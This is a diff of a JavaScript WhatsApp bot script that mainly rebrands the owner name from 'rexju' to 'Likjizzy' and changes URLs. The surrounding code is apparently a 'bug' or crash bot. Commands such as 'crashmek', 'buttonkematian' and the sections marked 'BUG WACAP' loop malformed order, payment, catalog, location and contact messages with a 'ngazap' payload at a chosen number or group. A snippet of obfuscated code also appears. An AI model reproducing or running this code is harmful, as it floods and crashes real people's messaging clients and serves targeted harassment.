-"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© °rexju°͢\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer © °rexju°͢WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:© °rexju°͢\nEND:VCARD",
+"displayName": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
+"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© 𝐿𝑖𝑥𝑥𝑧𝑦͢\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer © 𝐿𝑖𝑥𝑥𝑧𝑦͢WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:© 𝐿𝑖𝑥𝑥𝑧𝑦͢\nEND:VCARD",
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
@@ -1193,7 +1193,7 @@ haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 }
 break
 //=================================================//
-case 'lokas': case 'rexjulokas': {
+case 'lokas': case 'likjilokas': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1205,7 +1205,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"caption": `© © °rexju°͢${ngazap(prefix)}`,
+"caption": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -1215,7 +1215,7 @@ haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.
 }
 break
 //=================================================//
-case 'buglokas': case 'rexjulokas2': {
+case 'buglokas': case 'likjilokas2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1227,7 +1227,7 @@ var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"caption": `© © °rexju°͢${ngazap(prefix)}`,
+"caption": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: doc })
@@ -1248,8 +1248,8 @@ var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": `MY NAME © °rexju°͢${ngazap(prefix)}`,
-"groupName": `MY NAME © °rexju°͢${ngazap(prefix)}`,
+"inviteExpiration": `MY NAME © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
+"groupName": `MY NAME © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
 "caption": `${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -1259,7 +1259,7 @@ haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id
 }
 break
 //=================================================//
-case 'rexjutroli': {
+case 'likjitroli': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1274,9 +1274,9 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `© © °rexju°͢${ngazap(prefix)}`,
+"message": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
 "jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
-"orderTitle": `© © °rexju°͢${ngazap(prefix)}`,
+"orderTitle": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
 "sellerJid": "6285714170944@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
@@ -1301,15 +1301,15 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© © °rexju°͢${ngazap(prefix)}`,
-"description": `© © °rexju°͢`,
+"title": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
+"description": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,
 "currencyCode": "IDR",
-"footerText": `© © °rexju°͢`,
+"footerText": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,
 "priceAmount1000": "10000000",
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© © °rexju°WE ARE NOT MASTOD`,
+"retailerId": `© © 𝐿𝑖𝑥𝑥𝑧𝑦WE ARE NOT MASTOD`,
 "url": "wa.me/6285714170944"
 },
 "businessOwnerJid": "6285714170944@s.whatsapp.net",
@@ -1333,13 +1333,13 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© © °rexju°͢${ngazap(prefix)}`,
-"description": `© © °rexju°͢`,
+"title": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
+"description": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,
 "currencyCode": "IDR",
-"footerText": `© © °rexju°͢`,
+"footerText": `© © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,
 "productImageCount": 1,
 "firstImageId": 1,
-"retailerId": `© © °rexju°WE ARE NOT MASTOD`,
+"retailerId": `© © 𝐿𝑖𝑥𝑥𝑧𝑦WE ARE NOT MASTOD`,
 "url": "wa.me/6285714170944"
 },
 "businessOwnerJid": "6285714170944@s.whatsapp.net",
@@ -1352,18 +1352,18 @@ m.reply(tekteka)
 }
 break
 //=================================================//
-case 'rexjujagoan' : {
+case 'likjijagoan' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
-haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `${buttonkal}`,
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}}}}, { quoted:doc})
 }
@@ -1371,7 +1371,7 @@ thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg',
 break
 //=================================================//
 /*BUG WACAP */
-case 'rexjuskuy' : {
+case 'likjiskuy' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
@@ -1396,7 +1396,7 @@ await sleep(20)
 break
 //=================================================//
 /*BUG WACAP */
-case 'gasrexju' : {
+case 'gaslikji' : {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
@@ -1435,39 +1435,39 @@ function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=fun
 }
 }
 break
-case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'rexjunih': case 'crashar18': case 'mexdemam': case 'rexju1': case 'rexju2': case 'rexju3': case 'rexju4': case 'rexju5': case 'rexju6': case 'rexju7': case 'rexju8': case 'rexju9': case 'rexju10': case 'rexju11': case 'rexju12': case 'rexju13': case 'rexju14': case 'rexju15': case 'rexju16': case 'rexju17': case 'rexju18': case 'rexju19': case 'rexju20': case 'rexju21': case 'rexju22': case 'rexju23': case 'rexju24': case 'rexju25': case 'rexju26': case 'rexju27': case 'rexju28':
-case 'rexju29':
-case 'rexju30':
-case 'rexju31':
-case 'rexju32':
-case 'rexju33':
-case 'rexju34':
-case 'rexju35':
-case 'rexju36':
-case 'rexju37':
-case 'rexju38':
-case 'rexju39':
-case 'rexju40':
-case 'rexju41':
-case 'rexju42':
-case 'rexju43':
-case 'rexju44':
-case 'rexju45':
-case 'rexju46':
-case 'rexju47':
-case 'rexju48':
-case 'rexju49':
-case 'rexju50':
-case 'rexju51':
-case 'rexju52':
-case 'rexju53':
-case 'rexju54':
-case 'rexju55':
-case 'rexju56':
-case 'rexju57':
-case 'rexju58':
-case 'rexju59':
-case 'rexju60':
+case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'likjinih': case 'crashar18': case 'mexdemam': case 'likji1': case 'likji2': case 'likji3': case 'likji4': case 'likji5': case 'likji6': case 'likji7': case 'likji8': case 'likji9': case 'likji10': case 'likji11': case 'likji12': case 'likji13': case 'likji14': case 'likji15': case 'likji16': case 'likji17': case 'likji18': case 'likji19': case 'likji20': case 'likji21': case 'likji22': case 'likji23': case 'likji24': case 'likji25': case 'likji26': case 'likji27': case 'likji28':
+case 'likji29':
+case 'likji30':
+case 'likji31':
+case 'likji32':
+case 'likji33':
+case 'likji34':
+case 'likji35':
+case 'likji36':
+case 'likji37':
+case 'likji38':
+case 'likji39':
+case 'likji40':
+case 'likji41':
+case 'likji42':
+case 'likji43':
+case 'likji44':
+case 'likji45':
+case 'likji46':
+case 'likji47':
+case 'likji48':
+case 'likji49':
+case 'likji50':
+case 'likji51':
+case 'likji52':
+case 'likji53':
+case 'likji54':
+case 'likji55':
+case 'likji56':
+case 'likji57':
+case 'likji58':
+case 'likji59':
+case 'likji60':
 case '👽': case '☠️': case '️👾': case '🪐': case '🦴': case '☝': case '🏻': case '🦖': case '🦕': case '👿': case '🐉': case '⚡': case '💥': case '🔥': case '🌪️': case '🍂': case '🍃': case '🌴': case '🌿': case '🍀': case '🪵': case '🦥': case '🌳': case '🍁': case '🎋': 
 case '🦂':
 case '🐍':
@@ -1527,7 +1527,7 @@ m.reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
-case 'rexjustik': case 'rexjukangbug': case 'buttonkematian': case 'crashar19': {
+case 'likjistik': case 'likjikangbug': case 'buttonkematian': case 'crashar19': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1571,7 +1571,7 @@ m.reply(mess.wait)
 haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted:m })
 break
 //=================================================//
-case 'rexjubugie': case 'rexjukangbug1': case 'crashar20': {
+case 'likjibugie': case 'likjikangbug1': case 'crashar20': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1591,7 +1591,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `© °rexju°͢${ngazap(prefix)}`,
+"fileName": `© 𝐿𝑖𝑥𝑥𝑧𝑦͢${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 }
 }
@@ -1606,14 +1606,14 @@ if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`
 let anu = await store.chats.all().map(v => v.id)
-let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./baseikal/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '© °rexju°͢', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
+let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./baseikal/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '© 𝐿𝑖𝑥𝑥𝑧𝑦͢', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
 m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
 for (let i of anu) {
 await sleep(1500)
 let butoon = [{
 urlButton: {
 displayText: `GITHUB`,
-url: 'https://youtube.com/c/HwModsWa857'
+url: 'https://youtube.com/@user-pb3qt2ek1x'
 }
 },
 {
@@ -1646,7 +1646,7 @@ break
 case 'bugbctext': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!text) throw `*Type some text*\n\nExample : ${prefix + command} rexjumods`
+if (!text) throw `*Type some text*\n\nExample : ${prefix + command} likjimods`
